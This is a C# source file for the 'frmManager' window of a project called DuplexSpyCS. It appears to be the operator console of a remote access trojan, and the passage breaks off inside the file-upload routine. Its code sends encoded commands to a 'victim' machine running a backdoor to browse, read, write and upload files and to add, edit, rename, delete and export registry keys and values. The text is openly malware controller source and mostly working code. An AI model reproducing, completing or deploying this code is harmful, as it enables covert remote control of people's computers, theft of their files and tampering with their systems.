/* Introduction
 *      This is frmManager, it is constituted by the following function:
 *      1. File Manager
 *      2. Task Manager
 *      3. Registry Editor
 *      4. Service Manager
 *      5. Connection Viewer (Improve in soon)
 *      6. Window Viewer (Improve in soon)
 *      
 * Prefix:
 *      1. Function
 *          1.1. Req: Request
 *          1.2. Resp: Response
 * 
 */

using ICSharpCode.TextEditor.Document;
using Microsoft.Win32;
using System.Data;
using System.Diagnostics;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace DuplexSpyCS
{
    public partial class frmManager : Form
    {
        public clsVictim v { get; init; }
        string current_path;
        frmWindowCapture f_winCap;
        private string file_homedir;
        private static clsIniManager ini_manager = clsStore.ini_manager;

        //File transfer
        public bool g_bUploadFile { get; set; }
        public bool g_bUploadPause { get; set; }

        private Dictionary<string, string[]> dic_fields = new Dictionary<string, string[]>()
        {
            {
                "task",
                new string[]
                {
                    "Name",
                    "ProcessId",
                    "Handle",
                    "Description",
                    "Status",
                    "CommandLine",
                    "CreationDate",
                    "ExecutionState",
                    "ExecutablePath",
                }
            },
            {
                "serv",
                new string[]
                {
                    "Name",
                    "DisplayName",
                    "ProcessId",
                    "State",
                    "ServiceType",
                    "Description",
                    "InstallDate",
                    "AcceptPause",
                    "AcceptStop",
                    "PathName",
                }
            },
        };

        private List<string[]> l_CopyClipboard = new List<string[]>(); //Array, 0: dir/file; 1: full path.
        private List<string[]> l_CutClipboard = new List<string[]>();

        private List<ListViewItem> g_lsTaskLv;
        private List<ListViewItem> g_lsServLv;

        //Config
        private SettingConfig mgrConfig => clsStore.settingConfig;

        public frmManager(clsVictim victim)
        {
            InitializeComponent();

            v = victim;
            v.m_listener.ReceivedDecoded += fnRecv;
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, v))
                return;

            if (lsMsg[0] == "file")
            {
                if (lsMsg[1] == "init")
                {

                }
                else if (lsMsg[1] == "sd")
                {

                }
                else if (lsMsg[1] == "goto")
                {

                }
            }
            else if (lsMsg[0] == "task")
            {

            }
            else if (lsMsg[0] == "service")
            {

            }
            else if (lsMsg[0] == "window")
            {

            }
        }

        #region Global Function

        /// <summary>
        /// Search TreeNode with ListView path and return TreeNode.
        /// </summary>
        /// <param name="collection">TreeNode collection</param>
        /// <param name="fullPath">TreeView node full path.</param>
        /// <param name="comparison">Comparison method.</param>
        /// <returns></returns>
        TreeNode FindTreeNodeByFullPath(TreeNodeCollection collection, string fullPath, StringComparison comparison = StringComparison.InvariantCultureIgnoreCase)
        {
            var foundNode = collection.Cast<TreeNode>().FirstOrDefault(tn => string.Equals(tn.FullPath, fullPath, comparison));
            if (null == foundNode)
            {
                foreach (var childNode in collection.Cast<TreeNode>())
                {
                    var foundChildNode = FindTreeNodeByFullPath(childNode.Nodes, fullPath, comparison);
                    if (null != foundChildNode)
                    {
                        return foundChildNode;
                    }
                }
            }

            return foundNode;
        }

        /// <summary>
        /// Convert path into TreeNode and add into TreeView.
        /// </summary>
        /// <param name="path"></param>
        /// <param name="node"></param>
        /// <param name="unix_like"></param>
        public void RecursionAddTreeNodePath(string[] path, TreeNode node, bool unix_like = true)
        {
            if (path.Length == 0)
                return;

            if (path[0].Contains(":") || !unix_like) //Windows
            {
                string[] _path = path;
                if (_path[0] == node.Text && node.Parent == null)
                    _path = _path.Where((str, index) => index != 0).ToArray();

                if (string.IsNullOrWhiteSpace(_path[0]))
                    return;

                //CHECK DIR EXISTS
                TreeNode _node = null;
                foreach (TreeNode x in node.Nodes)
                {
                    if (x.Text == _path[0])
                    {
                        _node = x;
                        break;
                    }
                }
                //IF NOT EXISTS, THEN ADD NEW NODE INTO TREEVIEW
                if (_node == null)
                {
                    _node = new TreeNode(_path[0]);
                    _node.ImageIndex = 0;
                    node.Nodes.Add(_node);
                }

                _path = _path.Where((str, index) => index != 0).ToArray();
                RecursionAddTreeNodePath(_path, _node, false);
            }
            else //Unix like
            {
                string[] _path = path;
                if (_path[0] == node.Text && node.Parent == null)
                    _path = _path.Where((str, index) => index != 0).ToArray();

                TreeNode _node = new TreeNode(_path[0]);
                node.Nodes.Add(_node);
                _path = _path.Where((str, index) => index != 0).ToArray();
                RecursionAddTreeNodePath(_path, _node, false);
            }
        }

        #endregion
        #region Reg editor
        /*
         *  textbox2
         *  treeview3
         *  listview6
         */
        /// <summary>
        /// Registry initialization.
        /// This function is used by "Received Handler" in main Form. Do not use this function directly.
        /// </summary>
        /// <param name="data">Encoded data.</param>
        public void RegInit(string data)
        {
            Invoke(new Action(() =>
            {
                TreeNode computer_node = new TreeNode("Computer");
                computer_node.ImageIndex = 10;
                treeView3.Nodes.Add(computer_node);
                foreach (string root in data.Split(','))
                {
                    TreeNode node = new TreeNode(root);
                    node.ImageIndex = 3;
                    computer_node.Nodes.Add(node);
                }

                computer_node.Expand();
                toolStripStatusLabel4.Text = $"Hive[{computer_node.Nodes.Count}]";
            }));
        }

        /// <summary>
        /// Reg add items.
        /// This function is used by "Received Handler" in main Form. Do not use this function directly.
        /// </summary>
        /// <param name="path">Remote regedit path.</param>
        /// <param name="d1">Encoded data1.</param>
        /// <param name="d2">Encoded data2.</param>
        public void Reg_AddItem(string path, string d1, string d2)
        {
            TreeNode node = null;
            int cnt_subkeys = 0;
            int cnt_values = 0;
            path = Path.Combine("Computer", path);

            Invoke(new Action(() =>
            {
                node = FindTreeNodeByFullPath(treeView3.Nodes, path);
                textBox2.Text = path;
                textBox2.Tag = path;
            }));
            if (node == null)
                return;

            //TreeView
            List<string> lsStrNodes = new List<string>();
            List<string> lsD1 = new List<string>();
            lsD1.AddRange(d1.Split(","));
            Invoke(new Action(() => lsStrNodes.AddRange(node.Nodes.Cast<TreeNode>().Select(x => x.Text).ToList())));
            //Add New
            foreach (string subkey in lsD1)
            {
                if (string.IsNullOrEmpty(subkey))
                    break;

                if (lsStrNodes.Contains(subkey))
                    continue;

                TreeNode key_node = new TreeNode(subkey);
                key_node.ImageIndex = 3;
                Invoke(new Action(() => node.Nodes.Add(key_node)));
                cnt_subkeys++;
            }
            //Remove Not Exist
            Invoke(new Action(() =>
            {
                foreach (TreeNode node in node.Nodes)
                {
                    if (node == null)
                        continue;

                    if (!lsD1.Contains(node.Text))
                        treeView3.Nodes.Remove(node);
                }
            }));

            //ListView
            foreach (string row in d2.Split(";"))
            {
                if (string.IsNullOrEmpty(row))
                    break;

                string[] s = row.Split(",");
                ListViewItem item = new ListViewItem(s[0]);
                item.SubItems.Add(s[1]);
                item.SubItems.Add(clsCrypto.b64D2Str(s[2]));

                if (s[1].Contains("WORD") || s[1].Contains("BINARY"))
                    item.ImageIndex = 6;
                else
                    item.ImageIndex = 5;

                Invoke(new Action(() => listView6.Items.Add(item)));
                cnt_values++;
            }

            Invoke(new Action(() =>
            {
                node.Expand();
                toolStripStatusLabel4.Text = $"Action successfully | Key[{cnt_subkeys}] Value[{cnt_values}]";
            }));
        }

        /// <summary>
        /// Reg go to.
        /// This function is used by "Received Handler" in main Form. Do not use this function directly.
        /// </summary>
        /// <param name="path">Remote regedit path.</param>
        /// <param name="code">0: Not exist; 1: Exist.</param>
        public void Reg_Goto(string path, string code)
        {
            Invoke(new Action(() =>
            {
                string complete_path = Path.Combine(new string[]
                {
                    "Computer", //HOST
                    path,
                });

                TreeNode node = FindTreeNodeByFullPath(treeView3.Nodes, complete_path);
                if (node == null)
                {
                    string[] s = complete_path.Split("\\");
                    RecursionAddTreeNodePath(s, FindTreeNodeByFullPath(treeView3.Nodes, s[0]));
                    node = FindTreeNodeByFullPath(treeView3.Nodes, complete_path);
                    treeView3.SelectedNode = node;
                }
                else
                {
                    treeView3.SelectedNode = node;
                }
            }));
        }

        /// <summary>
        /// Refresh RegEdit.
        /// </summary>
        public void Reg_Refresh()
        {
            Invoke(new Action(() =>
            {
                string path = Reg_GetCurrentPath();
                TreeNode node = FindTreeNodeByFullPath(treeView3.Nodes, path);
                if (node != null)
                {
                    treeView3.SelectedNode = null;
                    treeView3.SelectedNode = node;
                }
            }));
        }

        /// <summary>
        /// Add New SubKey.
        /// </summary>
        /// <param name="currentPath">Full path of current key(directory).</param>
        /// <param name="keyName">Key name of add.</param>
        public void Reg_ReqAddKey(string currentPath, string keyName)
        {
            v.SendCommand($"reg|add|key|{clsCrypto.b64E2Str(currentPath)}|{clsCrypto.b64E2Str(keyName)}");
        }
        public void Reg_RespAddKey(int code, string msg)
        {
            if (code == 0)
            {
                MessageBox.Show(msg, "Error - RegAddKey()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }

        /// <summary>
        /// Request Add registry value
        /// </summary>
        /// <param name="currentPath"></param>
        /// <param name="valName"></param>
        /// <param name="kind"></param>
        public void Reg_ReqAddValue(string currentPath, string valName, string kind)
        {
            v.SendCommand($"reg|add|val|{clsCrypto.b64E2Str(currentPath)}|{clsCrypto.b64E2Str(valName)}|{kind}");
        }

        /// <summary>
        /// Handle response message of AddValue()
        /// </summary>
        /// <param name="code"></param>
        /// <param name="msg"></param>
        public void Reg_RespAddValue(int code, string msg)
        {
            if (code == 0)
            {
                MessageBox.Show(msg, "Error - RegAddValue()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }

        /// <summary>
        /// Request edit registry value
        /// </summary>
        public void Reg_ReqEditValue(string regFullPath, string valName, RegistryValueKind valKind, object valData)
        {
            string valPayload = string.Empty;
            switch (valKind)
            {
                case RegistryValueKind.String:
                    valPayload = clsCrypto.b64E2Str((string)valData);
                    break;
                case RegistryValueKind.Binary:
                    valPayload = Convert.ToBase64String((byte[])valData);
                    break;
                case RegistryValueKind.QWord:
                    valPayload = ((int)valData).ToString();
                    break;
                case RegistryValueKind.DWord:
                    valPayload = ((int)valData).ToString();
                    break;
                case RegistryValueKind.MultiString:
                    valPayload = clsCrypto.b64E2Str((string)valData);
                    break;
                case RegistryValueKind.ExpandString:
                    valPayload = clsCrypto.b64E2Str((string)valData);
                    break;
            }

            v.SendCommand($"reg|edit|{clsCrypto.b64E2Str(regFullPath)}|{clsCrypto.b64E2Str(valName)}|{valKind.ToString()}|{valPayload}");
        }

        /// <summary>
        /// Rename key. Basically, we copy srcPath(target key) into dstPath and then delete srcPath.
        /// </summary>
        /// <param name="keyPath"></param>
        /// <param name="srcPath"></param>
        /// <param name="dstPath"></param>
        public void Reg_ReqKeyRename(string keyPath, string srcPath, string dstPath)
        {
            v.SendCommand($"reg|rename|key|{clsCrypto.b64E2Str(keyPath)}|{clsCrypto.b64E2Str(srcPath)}|{clsCrypto.b64E2Str(dstPath)}");
        }

        /// <summary>
        /// Resposne from victim, show response message,
        /// </summary>
        /// <param name="code"></param>
        /// <param name="msg"></param>
        public void Reg_RespKeyRename(int code, string msg)
        {
            Invoke(new Action(() =>
            {
                switch (code)
                {
                    case 0:
                        MessageBox.Show(msg, "KeyRename() Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        break;
                    case 1:
                        MessageBox.Show("Action successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        ((frmRegKeyRename)clsTools.GetFormByVictim(v, Function.RegRenameKey)).Close();
                        break;
                }
            }));
        }
        public void Reg_ReqValueRename(string currentPath, string originalName, string newName)
        {
            v.SendCommand($"reg|rename|val|{clsCrypto.b64E2Str(originalName)}|{clsCrypto.b64E2Str(newName)}");
        }
        public void Reg_RespValueRename(int code, string msg)
        {
            Invoke(new Action(() =>
            {
                switch (code)
                {
                    case 0:
                        MessageBox.Show(msg, "ValueRename() Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        break;
                    case 1:
                        MessageBox.Show("Action successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        break;
                }
            }));
        }

        /// <summary>
        /// Send "Delete Registry Key" request.
        /// </summary>
        /// <param name="currentPath"></param>
        public void Reg_ReqKeyDelete(string currentPath)
        {
            v.SendCommand($"reg|del|key|{clsCrypto.b64E2Str(currentPath)}");
        }

        /// <summary>
        /// Process response of KeyDelete()
        /// </summary>
        /// <param name="code"></param>
        /// <param name="msg"></param>
        public void Reg_RespKeyDelete(int code, string msg)
        {
            Invoke(new Action(() =>
            {

            }));
        }

        /// <summary>
        /// Send delete registry value request.
        /// </summary>
        /// <param name="currentPath"></param>
        /// <param name="valNames"></param>
        public void Reg_ReqValueDelete(string currentPath, string[] valNames)
        {
            string valNamePayload = string.Join(",", valNames.Select(x => clsCrypto.b64E2Str(x)).ToArray());
            v.SendCommand($"reg|del|val|{clsCrypto.b64E2Str(currentPath)}|{valNamePayload}");
        }

        /// <summary>
        /// Show response of delete registry value request.
        /// </summary>
        /// <param name="code"></param>
        /// <param name="msg"></param>
        public void Reg_RespValueDelete(int code, string msg)
        {
            Invoke(new Action(() =>
            {

            }));
        }

        /// <summary>
        /// Find keys and values with specified paths.
        /// </summary>
        public void Reg_ReqFind()
        {

        }

        /// <summary>
        /// Send export command, and then send back the *.reg file
        /// </summary>
        private void Reg_Export()
        {
            if (textBox2.Tag == null)
            {
                MessageBox.Show("Null tag", "Reg_Export()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Registry File|*.reg|Text File|*.txt";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                string path = (string)textBox2.Tag;
                v.encSend(2, 0, $@"reg|export|{clsCrypto.b64E2Str(path)}|{clsCrypto.b64E2Str(sfd.FileName)}");
            }
        }

        /// <summary>
        /// Request registry import file.
        /// </summary>
        private void Reg_Import()
        {
            //Todo: Finish this function
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Registry File|*.reg|Text File|*.txt";
            if (ofd.ShowDialog() == DialogResult.OK)
            {

            }
        }

        /// <summary>
        /// Return current full path.
        /// </summary>
        /// <returns></returns>
        private string Reg_GetCurrentPath()
        {
            return (string)textBox2.Tag;
        }

        /// <summary>
        /// Show "Find" function window form.
        /// </summary>
        private void Reg_FindStartup()
        {
            frmRegFind f = new frmRegFind();
            f.currentPath = Reg_GetCurrentPath();
            f.v = v;
            f.Tag = Function.RegFind;
            f.Text = $@"RegFind\\{v.ID}";
            f.Show();
        }

        private void Reg_ReqPasteKey(string srcFullPath, string dstFullPath, bool bCopy)
        {
            //bCopy: true: Copy, false: Cut(Delete after copy)

        }
        private void Reg_RespPasteKey(int code, string msg)
        {
            switch (code)
            {
                case 0:
                    MessageBox.Show(msg, "Error - PasteKey()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    break;
                case 1:
                    MessageBox.Show("Action successfully", "PasteKey()", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    break;
            }
        }

        private void Reg_ReqPasteValue(string srcFullPath, string srcValName, string dstFullPath, string dstValName, bool bCopy)
        {
            //bCopy: true: Copy, false: Cut(Delete after copy)

        }
        private void Reg_RespPasteValue(int code, string msg)
        {
            switch (code)
            {
                case 0:
                    MessageBox.Show(msg, "Error - PasteValue()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    break;
                case 1:
                    MessageBox.Show("Action successfully", "PasteValue()", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    break;
            }
        }

        private void Reg_KeySetClipboard(bool bCopy)
        {
            TreeNode tNode = treeView8.Nodes[0];
            TreeNode kNode = treeView8.Nodes[1];
            TreeNode vNode = treeView8.Nodes[2];

            tNode.Nodes.Clear();
            kNode.Nodes.Clear();
            vNode.Nodes.Clear();

            tNode.Nodes.Add(new TreeNode(bCopy ? "Copy" : "Cut"));

            string regFullPath = Reg_GetCurrentPath();
            string[] pathSplit = regFullPath.Split('\\');

            if (pathSplit.Length <= 2)
            {
                MessageBox.Show("Invalid Path: " + regFullPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string keyName = pathSplit.Last();

            TreeNode node = new TreeNode(keyName);
            node.Tag = regFullPath;

            kNode.Nodes.Add(node);
        }
        private void Reg_ValueSetClipboard(bool bCopy)
        {
            TreeNode tNode = treeView8.Nodes[0];
            TreeNode kNode = treeView8.Nodes[1];
            TreeNode vNode = treeView8.Nodes[2];

            tNode.Nodes.Clear();
            kNode.Nodes.Clear();
            vNode.Nodes.Clear();

            tNode.Nodes.Add(new TreeNode(bCopy ? "Copy" : "Cut"));

            string regFullPath = Reg_GetCurrentPath();
            foreach (ListViewItem item in listView6.SelectedItems)
            {
                TreeNode node = new TreeNode(item.Text);
                node.Tag = new string[] { regFullPath, item.Text };
                vNode.Nodes.Add(node);
            }
        }

        /// <summary>
        /// Show ValueEdit winform.
        /// </summary>
        private void Reg_ShowEdit()
        {
            ListViewItem[] items = listView6.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            string szValKind = items[0].SubItems[1].Text;
            if (szValKind == "REG_SZ")
            {
                frmRegEditString f = new frmRegEditString();
                f.regFullPath = Reg_GetCurrentPath();
                f.valName = items[0].Text;
                f.valData = items[0].SubItems[2].Text;
                f.Text = "Edit String";
                f.ShowDialog();
            }
            else if (szValKind == "REG_MULTI_SZ")
            {
                frmRegEditMultiString f = new frmRegEditMultiString();
                f.regFullPath = Reg_GetCurrentPath();
                f.valName = items[0].Text;
                f.valData = items[0].SubItems[2].Text;
                f.Text = "Edit Multiple String";
                f.ShowDialog();
            }
            else if (szValKind == "REG_EXPAND_SZ")
            {
                frmRegEditString f = new frmRegEditString();
                f.regFullPath = Reg_GetCurrentPath();
                f.valName = items[0].Text;
                f.valData = items[0].SubItems[2].Text;
                f.Text = "Edit Expand String";
                f.ShowDialog();
            }
            else if (szValKind == "REG_BINARY")
            {
                frmRegEditBinary f = new frmRegEditBinary();
                f.regFullPath = Reg_GetCurrentPath();
                f.Text = "Edit Binary";
                f.ShowDialog();
            }
            else if (szValKind == "REG_DWORD" || szValKind == "REG_QWORD")
            {
                frmRegEditWord f = new frmRegEditWord();
                f.regFullPath = Reg_GetCurrentPath();
                f.valName = items[0].Text;
                f.valData = int.Parse(items[0].SubItems[2].Text, System.Globalization.NumberStyles.HexNumber);
                f.Text = "Edit Word";
                f.ShowDialog();
            }
        }

        #endregion
        #region FileMgr
        /// <summary>
        /// "FileMgr" function initialization.
        /// This function is used by "Received Handler" in main Form. Do not use this function directly.
        /// </summary>
        /// <param name="cp">Current path of backdoor.</param>
        /// <param name="data">Encoded data.</param>
        public void FileInit(string cp, string data, string strShortCuts, string info)
        {
            Invoke(new Action(() =>
            {
                FileSetPath(cp);
                file_homedir = cp;
                foreach (string drive_info in data.Split("-"))
                {
                    string[] s = drive_info.Split(",");
                    TreeNode node = new TreeNode(s[0]);
                    node.ImageIndex = 1;
                    treeView1.Nodes.Add(node);
                }
                string root = cp.Split("\\")[0];
                TreeNode root_node = FindTreeNodeByFullPath(treeView1.Nodes, root);
                RecursionAddTreeNodePath(cp.Split("\\")[1..], root_node);
                treeView1.ExpandAll();

                TreeNode current_node = FindTreeNodeByFullPath(treeView1.Nodes, cp);
                current_path = cp;
                if (current_node != null)
                    treeView1.SelectedNode = current_node;

                //SHORT CUT
                List<string> shortCuts = strShortCuts.Split(",").Select(x => clsCrypto.b64D2Str(x)).ToList();
                foreach (string s in shortCuts)
                {
                    //FIND DRIVER TREE NODE
                    TreeNode rootNode = null;
                    string driverName = s.Split(":")[0];
                    foreach (TreeNode x in treeView6.Nodes)
                    {
                        //CHECK DRIVER EXISTS
                        if (x.Text == driverName)
                        {
                            rootNode = x;
                            break;
                        }
                    }

                    if (rootNode == null)
                    {
                        rootNode = new TreeNode(driverName);
                        treeView6.Nodes.Add(rootNode);
                    }

                    TreeNode sNode = new TreeNode(Path.GetFileName(s)); //SHORT CUT NODE
                    rootNode.Nodes.Add(sNode);
                    sNode.Tag = s;
                }
                treeView6.Refresh();
                treeView6.ExpandAll();

                //Show Information
                string[] infoPayload = info.Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
                foreach (string s in infoPayload)
                {
                    string key = s.Split(";")[0];
                    string val = s.Split(';')[1];

                    TreeNode node = new TreeNode(key);
                    node.Nodes.Add(new TreeNode(val));

                    treeView5.Nodes.Add(node);
                }
            }));
        }

        /// <summary>
        /// Get selected ListView item tag object.
        /// </summary>
        /// <param name="item">Selected ListView item.</param>
        /// <returns></returns>
        public string[] File_GetItemObj(ListViewItem item)
        {
            string[] result = new string[2];
            Invoke(new Action(() =>
            {
                if (item.Tag != null)
                {
                    object[] objs = (object[])item.Tag;
                    result = objs.Select(x => x.ToString()).ToArray();
                }
            }));

            return result;
        }

        /// <summary>
        /// Show "go to specified path" result.
        /// This function is used by "Received Handler" in main Form. Do not use this function directly.
        /// </summary>
        /// <param name="path">Encoded path</param>
        public void FileGoto(int code, string path)
        {
            Invoke(new Action(() =>
            {
                if (code == 0)
                {
                    MessageBox.Show(path, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    textBox1.Text = textBox1.Tag.ToString();
                    return;
                }

                textBox1.Tag = path;
                string[] s = path.Split("\\");
                TreeNode root = FindTreeNodeByFullPath(treeView1.Nodes, s[0]);
                RecursionAddTreeNodePath(s, root);
                TreeNode node = FindTreeNodeByFullPath(treeView1.Nodes, path);
                treeView1.SelectedNode = node;
            }));
        }

        public string File_GetCurrentPath()
        {
            string path = string.Empty;
            Invoke(new Action(() => path = (string)textBox1.Tag));

            return path;
        }

        /// <summary>
        /// Show "Add items(folder, file) result".
        /// This function is used by "Received Handler" in main Form. Do not use this function directly.
        /// </summary>
        /// <param name="tgt_dir">Encoded remote directory.</param>
        /// <param name="d1">Folder data.</param>
        /// <param name="d2">File data.</param>
        public void File_AddItems(string tgt_dir, string d1, string d2)
        {
            List<string> lsCheckDeletedDir = new List<string>();

            if (tgt_dir.ToArray().Last() == '\\')
                tgt_dir = tgt_dir.Substring(0, tgt_dir.Length - 1);

            //To avoid display item in wrong directory.
            Invoke(new Action(() =>
            {
                if (tgt_dir != treeView1.SelectedNode.FullPath)
                    return;
            }));

            current_path = tgt_dir;

            void RemoveDeleted()
            {
                string currentPath = (string)textBox1.Tag;
                TreeNode currentNode = FindTreeNodeByFullPath(treeView1.Nodes, currentPath);
                Invoke(new Action(() =>
                {
                    if (currentNode == null)
                        return;

                    List<string> tvNodes = currentNode.Nodes.Cast<TreeNode>().Select(x => x.Text).ToList();
                    foreach (string dirName in tvNodes)
                    {
                        if (!lsCheckDeletedDir.Contains(dirName))
                        {
                            TreeNode node = FindTreeNodeByFullPath(currentNode.Nodes, Path.Combine(currentPath, dirName), StringComparison.OrdinalIgnoreCase);
                            treeView1.Nodes.Remove(node);
                        }
                    }
                }));
            }

            try
            {
                //PATH
                Invoke(new Action(() =>
                {
                    textBox1.Text = tgt_dir;
                    textBox1.Tag = tgt_dir;

                    listView1.Items.Clear();
                }));

                //Directory
                int cnt_dir = 0;
                int cnt_file = 0;
                foreach (string dir in d1.Split("+"))
                {
                    string[] s = dir.Split(";");
                    string name = Path.GetFileName(s[0]);
                    if (string.IsNullOrEmpty(name))
                        continue;

                    ListViewItem item = new ListViewItem(name);
                    item.ImageKey = "folder";
                    item.SubItems.AddRange(s.Select(x => new ListViewItem.ListViewSubItem() { Text = x })
                        .Select((x, idx) => new { x, idx }).
                        Where(x => x.idx != 0).
                        Select(x => x.x)
                        .ToArray());

                    //Check Error
                    if (item.SubItems.Count < listView1.Columns.Count)
                        continue;
                    if (string.IsNullOrEmpty(item.SubItems[1].Text))
                        continue;

                    item.Tag = new object[] { s[0], "d" };
                    Invoke(new Action(() =>
                    {
                        listView1.Items.Add(item);

                        bool bItemExist = false;
                        bItemExist = FindTreeNodeByFullPath(treeView1.Nodes, s[0]) != null;

                        string path = Path.Combine(current_path, name);

                        if (FindTreeNodeByFullPath(treeView1.Nodes, path) == null)
                        {
                            TreeNode node = FindTreeNodeByFullPath(treeView1.Nodes, current_path);
                            if (node == null)
                            {
                                TreeNode driverNode = FindTreeNodeByFullPath(treeView1.Nodes, current_path.Split("\\")[0]);
                                RecursionAddTreeNodePath(current_path.Split("\\"), driverNode);
                                node = FindTreeNodeByFullPath(treeView1.Nodes, current_path);
                            }

                            int idx = -1;
                            if (node != null)
                            {
                                if (node.Nodes.Count > 0)
                                {
                                    for (int i = 0; i < node.Nodes.Count; i++)
                                    {
                                        TreeNode child = node.Nodes[i];
                                        if (string.Compare(name, child.Text) > 0) //new item follow child
                                        {
                                            idx = i + 1;
                                        }
                                        else
                                        {
                                            idx = i;
                                            break;
                                        }
                                    }
                                }
                                idx = idx == -1 ? 0 : idx;
                                TreeNode new_node = new TreeNode(name);
                                node.Nodes.Insert(idx, new_node);
                                new_node.ImageIndex = 0;
                                new_node.EnsureVisible();
                                node.Expand();
                            }
                            else
                            {
                                //MessageBox.Show(current_path);
                            }
                        }

                        lsCheckDeletedDir.Add(name);
                    }));
                    cnt_dir++;
                }
                RemoveDeleted();

                //File
                foreach (string file in d2.Split("+"))
                {
                    string[] s = file.Split(";");
                    if (string.IsNullOrEmpty(s[0]))
                        continue;

                    bool bItemExist = false;
                    Invoke(new Action(() =>
                    {
                        foreach (ListViewItem item in listView1.Items)
                        {
                            if (string.Compare(Path.GetFileName(s[0]), item.Text) == 0)
                            {
                                bItemExist = true;
                                break;
                            }
                        }
                    }));

                    if (bItemExist)
                        continue;

                    ListViewItem item = new ListViewItem(Path.GetFileName(s[0]));
                    item.SubItems.AddRange(s.Select(x => new ListViewItem.ListViewSubItem() { Text = x })
                        .Select((x, idx) => new { x, idx }).
                        Where(x => x.idx != 0).
                        Select(x => x.x)
                        .ToArray());
                    item.Tag = new object[] { s[0], "f" };
                    string ext = Path.GetExtension(s[0]);
                    Invoke(new Action(() =>
                    {
                        if (!clsStore.il_extension.Images.ContainsKey(ext))
                        {
                            string temp_file = Path.GetTempPath() + Guid.NewGuid().ToString() + $"{ext}";
                            File.Create(temp_file).Close();
                            Icon icon = Icon.ExtractAssociatedIcon(temp_file);
                            File.Delete(temp_file);
                            clsStore.il_extension.Images.Add(ext, icon);
                        }
                    }));
                    item.ImageKey = ext;
                    Invoke(new Action(() => listView1.Items.Add(item)));
                    cnt_file++;
                }

                Invoke(new Action(() =>
                {
                    toolStripStatusLabel2.Text = $"Action successfully | Folder[{cnt_dir}] File[{cnt_file}]";
                }));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            Invoke(new Action(() =>
            {
                treeView1.Enabled = true;
            }));
        }

        private void FileSetPath(string path)
        {
            textBox1.Text = path;
            textBox1.Tag = path;
        }

        /// <summary>
        /// Show "Read" function text content.
        /// This function is used by "Received Handler" in main Form. Do not use this function directly.
        /// </summary>
        /// <param name="code">State code(0: error, 1: ok)</param>
        /// <param name="d1">Text file path.</param>
        /// <param name="d2">File content with base-64 encoded.</param>
        public void File_Read(string code, string d1, string d2)
        {
            string path = clsCrypto.b64D2Str(d1);
            string text = clsCrypto.b64D2Str(d2);

            frmTextEditor f_editor = (frmTextEditor)clsTools.GetFormByVictim(v, Function.TextEditor);

            if (f_editor == null || f_editor.IsDisposed)
            {
                Invoke(new Action(() =>
                {
                    f_editor = new frmTextEditor();
                    f_editor.Tag = Function.TextEditor;
                    f_editor.v = v;
                    f_editor.Text = $@"TextEditor\\{v.ID}";
                    f_editor.currentDir = (string)textBox1.Tag;
                    f_editor.Show();
                }));
            }

            f_editor.ShowTextFile(path, text);
        }

        /// <summary>
        /// Show "Write" function result.
        /// This function is used by "Received Handler" in main Form. Do not use this function directly.
        /// </summary>
        /// <param name="code">State code(0: error, 1: ok)</param>
        /// <param name="data">code=0: Error message;code=1: Message of write file successfully</param>
        public void File_Write(string code, string data)
        {
            string msg = clsCrypto.b64D2Str(data);
            if (code == "1") //OK
            {
                frmTextEditor f = (frmTextEditor)clsTools.GetFormByVictim(v, Function.TextEditor);
                if (f == null)
                    return;

                f.ConfirmFileSave(msg);
            }
            else //FAILED
            {
                MessageBox.Show(msg, "ERROR - File Write", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Send read file request
        /// </summary>
        /// <param name="item">Selected item</param>
        private void File_SendRead(ListViewItem item)
        {
            Invoke(new Action(() =>
            {
                string[] objs = File_GetItemObj(item);
                if (objs.Length == 2 && objs[1] == "f")
                {
                    string path = objs[0];
                    v.encSend(2, 0, $"file|read|" + clsCrypto.b64E2Str(path));
                }
            }));
        }

        /// <summary>
        /// Upload file and show upload file state.
        /// </summary>
        /// <param name="l_path">List of local file path.</param>
        /// <param name="tgt_dir">Remote directory.</param>
        public void File_UploadFile(List<string[]> l_path, string tgt_dir, string szFlag = "single", bool bShowStatus = true)
        {
            frmFileTransferState f = null;
            if (bShowStatus)
            {
                f = new frmFileTransferState();
                f.Tag = Function.TransferFileState;
                f.v = v;
                f.files = l_path.Select(x => Path.Combine(tgt_dir, Path.GetFileName(x[1]))).ToList();
                f.transfer_type = TransferFileType.Upload;
                f.Text = $@"File Transfer\\{v.ID}";
                f.f_mgr = this;
                Invoke(new Action(() =>
                {
                    f.Show();
                }));
            }

            g_bUploadFile = true;
            g_bUploadPause = false;

            foreach (string[] path in l_path)
            {
                if (!g_bUploadFile)
                {
                    MessageBox.Show("Stop upload file!", "Signal", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                while (g_bUploadPause)
                {
                    Thread.Sleep(1000);
                }

                string filename = path[1];
                string tgt_filename = Path.Combine(tgt_dir, Path.GetFileName(filename));
                int chunk_size = 1024 * 5; //5KB

                using (FileStream fs = new FileStream(filename, FileMode.Open, FileAccess.Read))
                {
                    byte[] buffer = new byte[chunk_size];
                    int byte_reads;

                    FileInfo info = new FileInfo(filename);
                    long file_len = info.Length;

                    int i = 0;
                    while ((byte_reads = fs.Read(buffer, 0, buffer.Length)) > 0)
